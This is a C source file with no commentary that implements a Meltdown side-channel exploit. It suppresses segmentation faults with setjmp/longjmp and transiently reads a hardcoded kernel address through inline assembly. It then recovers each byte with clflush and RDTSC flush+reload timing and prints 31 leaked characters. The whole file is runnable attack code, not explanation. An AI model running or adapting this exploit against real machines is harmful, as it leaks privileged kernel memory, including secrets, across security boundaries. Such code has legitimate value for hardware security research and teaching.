#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <stdint.h>
#include <unistd.h>
#include <string.h>
#include <time.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <setjmp.h>
#include <signal.h>
jmp_buf buf;
uint32_t timing;
static void unblock_signal(int signum __attribute__((__unused__)))
{
	sigset_t sigs;
	sigemptyset(&sigs);
	sigaddset(&sigs, signum);
	sigprocmask(SIG_UNBLOCK, &sigs, NULL);
}

static void segfault_handler(int signum)
{
	(void)signum;
	unblock_signal(SIGSEGV);
	longjmp(buf, 1);
}
void clflush(volatile void *txdata)
{
	asm volatile("lfence;clflush (%0) \n" ::"c"(txdata));
}

static __inline__ uint64_t timer_start(void)
{
	unsigned cycles_low, cycles_high;
	asm volatile("CPUID\n\t"
				 "RDTSC\n\t"
				 "mov %%edx, %0\n\t"
				 "mov %%eax, %1\n\t"
				 : "=r"(cycles_high), "=r"(cycles_low)::"%rax", "%rbx", "%rcx", "%rdx");
	return ((uint64_t)cycles_high << 32) | cycles_low;
}

static __inline__ uint64_t timer_stop(void)
{
	unsigned cycles_low, cycles_high;
	asm volatile("RDTSCP\n\t"
				 "mov %%edx, %0\n\t"
				 "mov %%eax, %1\n\t"
				 "CPUID\n\t"
				 : "=r"(cycles_high), "=r"(cycles_low)::"%rax",
				   "%rbx", "%rcx", "%rdx");
	return ((uint64_t)cycles_high << 32) | cycles_low;
}

static __inline__ void maccess(void *p)
{
	asm volatile("movq (%0), %%rax\n"
				 :
				 : "c"(p)
				 : "rax");
}

uint32_t reload(void *target)
{
	volatile uint32_t time;
	uint64_t t1, t2;
	t1 = timer_start();
	maccess(target);
	t2 = timer_stop();
	return t2 - t1;
}

static __inline__ void meltdown(void *target, char *UserArray)
{
	asm volatile(
		"1:\n"
		"movzx (%%rcx), %%rax\n"
		"shl $12, %%rax\n"
		"jz 1b\n"
		"movq (%%rbx,%%rax,1), %%rbx\n" ::"c"(target),
		"b"(UserArray)
		: "rax");
}

int main()
{
	uint32_t space = 4096;
	uint32_t threshold = 150;

	if (signal(SIGSEGV, segfault_handler) == SIG_ERR)
	{
		printf("Failed to setup signal handler\n");
		return -1;
	}

	char *user_array = malloc(sizeof(uint8_t) * 256 * space);
  	memset(user_array, 0, sizeof(uint8_t) * 256 * space);
	void *target;
	target = (void *)(0xffff95ba223efa80);
	int count = 0;
	uint32_t rxdata = 0;
	while (1)
	{
		for (int i = 0; i < 256; i++)
		{
			clflush(&user_array[i * space]);
		}

		if (!setjmp(buf))
		{
			meltdown(target, user_array);
			continue;
		}

		rxdata = 0;
		for (int i = 0; i < 256; i++)
		{
			timing = reload(&user_array[i * space]);

			if (timing < threshold)
			{
				rxdata = i;
				break;
			}
		}

		if (rxdata != 0)
		{
			printf("%c\n", rxdata);
			target++;
			count++;
			//printf("%d\n", count);
		}
		if (count == 31)
		{
			break;
		}
	}

	return 0;
}
